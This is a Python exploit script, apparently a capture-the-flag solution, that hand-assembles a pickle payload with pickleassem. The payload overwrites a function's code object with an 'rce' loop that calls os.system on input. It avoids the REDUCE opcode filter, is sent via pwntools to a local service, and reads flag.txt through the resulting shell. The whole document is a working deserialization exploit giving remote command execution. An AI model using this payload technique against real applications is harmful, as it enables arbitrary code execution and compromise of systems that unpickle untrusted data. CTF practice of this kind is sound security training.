# Run with python 3.11

import pickle
import pickletools

# pip install pickleassem
from pickleassem import PickleAssembler


class SaveState: ...


def load_save(): ...


# If you want to build a custom payload, edit the following function.
# def rce():
#     while True:
#         __import__("os").system(input(">>> "))


# print(rce.__code__.co_argcount)
# print(rce.__code__.co_posonlyargcount)
# print(rce.__code__.co_kwonlyargcount)
# print(rce.__code__.co_nlocals)
# print(rce.__code__.co_stacksize)
# print(rce.__code__.co_flags)
# print(rce.__code__.co_code)
# print(rce.__code__.co_consts)
# print(rce.__code__.co_names)
# print(rce.__code__.co_varnames)
# print(rce.__code__.co_filename)
# print(rce.__code__.co_name)
# print(rce.__code__.co_qualname)
# print(rce.__code__.co_firstlineno)
# print(rce.__code__.co_linetable)
# print(rce.__code__.co_exceptiontable)
# print(rce.__code__.co_freevars)
# print(rce.__code__.co_cellvars)

a = PickleAssembler(proto=4)
a.push_global("__main__", "load_save")
a.push_none()
a.push_mark()
a.push_unicode("__code__")

a.push_mark()

a.push_mark()
a.push_global("__main__", "SaveState.__class__")
a.push_global("__main__", "load_save.__code__")
a.build_obj()

# co_argcount, co_posonlyargcount, co_kwonlyargcount, co_nlocals, co_stacksize, co_flags
for i in (0, 0, 0, 0, 5, 3):
    a.push_binint1(i)

# co_code
a.push_short_binbytes(
    b"\x97\x00\t\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c0"
)

# co_consts
a.push_mark()
a.push_none()
a.push_true()
a.push_unicode("os")
a.push_unicode(">>> ")
a.build_tuple()

# co_names
a.push_unicode("__import__")
a.push_unicode("system")
a.push_unicode("input")
a.build_tuple3()

# co_varnames
a.push_empty_tuple()

# co_filename
a.push_unicode("main.py")

# co_name
a.push_unicode("rce")

# co_qualname
a.push_unicode("rce")

# co_firstlineno
a.push_binint(156)

# co_linetable
a.push_short_binbytes(
    b"\x80\x00\xf0\x02\x01\x050\xdd\x08\x12\x904\xd1\x08\x18\xd4\x08\x18\xd7\x08\x1f\xd2\x08\x1f\xa5\x05\xa0g\xa1\x0e\xa4\x0e\xd1\x08/\xd4\x08/\xd0\x08/\xf0\x03\x01\x050"
)

# co_exceptiontable
a.push_short_binbytes(b"")

# co_freevars
a.push_empty_tuple()

# co_cellvars
a.push_empty_tuple()

a.build_obj()

a.build_dict()

a.build_tuple2()

a.build_build()

p = a.assemble()

print(p.hex())

pickletools.dis(p, annotate=1)
print(pickle.loads(p))

for op, _, _ in pickletools.genops(p):
    if op.code == "R":
        print("Disallowed opcode in save!")
        exit()


# pip install pwntools
from pwnlib.tubes.remote import remote  # noqa: E402

target = remote("127.0.0.1", 1337)

try:
    b = target.recvuntil(b"What is your name? ")
    print(b)
    target.sendline(b"Test")

    b = target.recvuntil(b"> ")
    print(b.decode())

    target.sendline(b"3")

    b = target.recvuntil(b"Enter your magic string: ")
    print(b.decode())

    target.sendline(f"{p.hex()}.c0ff33".encode())

    b = target.recvuntil(b"> ")
    print(b.decode())

    target.sendline(b"3")

    b = target.recvuntil(b">>> ")
    print(b.decode())

    target.sendline(b"cat flag.txt")

    b = target.recvuntil(b">>> ")
    print(b.decode())
finally:
    target.close()
